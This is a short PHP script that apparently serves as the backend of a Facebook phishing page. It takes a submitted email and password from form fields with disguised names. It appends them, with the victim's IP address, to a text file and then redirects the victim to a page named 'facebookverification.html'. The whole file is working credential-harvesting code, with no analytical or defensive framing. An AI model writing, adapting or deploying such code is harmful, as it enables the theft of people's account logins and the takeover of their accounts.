<?php 

if(isset($_POST['disini']) || isset($_POST['disana'])) {
	$email = $_POST['disini'];
    $pass  = $_POST['disana'];
	$ip    = $_SERVER['REMOTE_ADDR'];

	if(empty($email) || empty($pass)) {
		echo "<script>alert('Complete All Data!'); document.location='./';</script>";
	} else {
        $file = "----Co-Founder-01-Gasss-Pollll--.txt";
        
        $handle = fopen($file, 'a');
        fwrite($handle, "=======================================");
        fwrite($handle, "\n");
        fwrite($handle, "::  EMAIL     :: ");
        fwrite($handle, "$email");
        fwrite($handle, "\n");
        fwrite($handle, "::  PASSWORD  :: ");
        fwrite($handle, "$pass");
        fwrite($handle, "\n");
        fwrite($handle, "::  IP        :: ");
        fwrite($handle, "$ip");
        fwrite($handle, "\n");
        if(fclose($handle)) {
            echo "<script>location.href='facebookverification.html';</script>";
        }
	}
}